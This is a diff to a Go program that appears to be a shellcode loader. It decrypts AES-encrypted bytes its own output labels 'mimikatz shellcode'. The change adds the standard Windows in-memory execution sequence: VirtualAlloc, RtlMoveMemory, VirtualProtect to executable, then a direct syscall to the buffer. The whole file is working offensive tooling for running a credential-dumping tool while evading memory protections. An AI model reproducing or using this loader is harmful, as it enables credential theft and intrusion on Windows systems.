@@ -8,6 +8,8 @@ import (
 	"log"
 	"syscall"
 	"unsafe"
+
+	"golang.org/x/sys/windows"
 )
 
 var (
@@ -37,9 +39,23 @@ func decryptAES(data []byte, key []byte) ([]byte, error) {
 	return data, nil
 }
 
+// Credits to Joff Thyer for Direct Syscall Strategy: https://www.youtube.com/watch?v=gH9qyHVc9-M
 func main() {
 	fmt.Println("Decrypting mimikatz shellcode...")
 	shellcode, err := decryptAES(encryptedShellcode, key)
 	checkErr(err)
-	syscall.SyscallN(uintptr(unsafe.Pointer(&shellcode[0])))
+	// syscall.SyscallN(uintptr(unsafe.Pointer(&shellcode[0])))
+	kernel32 := windows.NewLazyDLL("kernel32.dll")
+	RtlMoveMemory := kernel32.NewProc("RtlMoveMemory")
+
+	addr, err := windows.VirtualAlloc(uintptr(0), uintptr(len(shellcode)),
+		windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
+	checkErr(err)
+	RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
+
+	var oldProtect uint32
+	err = windows.VirtualProtect(addr, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, &oldProtect)
+	checkErr(err)
+
+	syscall.SyscallN(addr, 0, 0, 0, 0)
 }
